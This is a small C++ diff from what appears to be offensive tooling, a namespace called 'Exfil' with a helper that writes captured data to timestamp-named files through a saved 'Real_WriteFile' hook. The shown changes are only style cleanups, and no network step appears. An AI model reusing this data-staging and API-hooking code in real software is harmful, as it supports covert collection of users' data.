@@ -16,7 +16,7 @@ namespace Exfil {
             filename = std::to_string(std::time(nullptr) / 600);
 
         if (dir.empty() || filename.empty())
-            return NULL;
+            return nullptr;
 
         std::string fullpath = dir + filename;
         DBG_MBA(fullpath.c_str());
@@ -34,7 +34,7 @@ namespace Exfil {
     }
 
     __forceinline bool ToFile(LPCVOID data, DWORD cbData, std::string filename = {}, std::string dir = {}) {
-        HANDLE hf = Exfil::OpenFile(filename, dir);
+        HANDLE hf = OpenFile(filename, dir);
         if (hf) {
 #ifdef DTR_WRITEFILE
             if (!Real_WriteFile(hf, data, cbData, nullptr, nullptr))
